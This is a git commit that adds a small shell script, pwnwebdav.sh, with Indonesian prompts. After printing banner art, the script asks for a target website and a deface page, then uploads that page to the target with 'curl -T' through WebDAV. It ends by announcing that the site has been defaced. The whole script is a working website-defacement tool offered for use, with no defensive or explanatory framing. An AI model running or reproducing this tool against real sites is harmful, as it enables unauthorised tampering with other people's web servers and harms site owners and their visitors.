bfd15c964c56d74a6b198726c9b0672be4671b03
MrPawNO <powermiyako@gmail.com>
2019-05-15 05:58:27 +0700

    Create pwnwebdav.sh

---
+++ pwnwebdav.sh
@@ -0,0 +1,7 @@
+clear
+cowsay -f eyes 'Mr.PawN0 WEBDAV' | lolcat
+figlet -f slant 'Mr.PawN0 WEBDAV' | lolcat
+read -p 'MASUKKAN WEB NYA BRO ==>' target;
+read -p 'MASUKKAN SCRIPT DEFACE LU BRO ==>>' sc;
+curl -T /sdcard/$sc $target
+echo '[+] OKE WEBSITE BERHASIL DI DEFACE DENGAN METODE WEBDAV==>>' $target/$sc
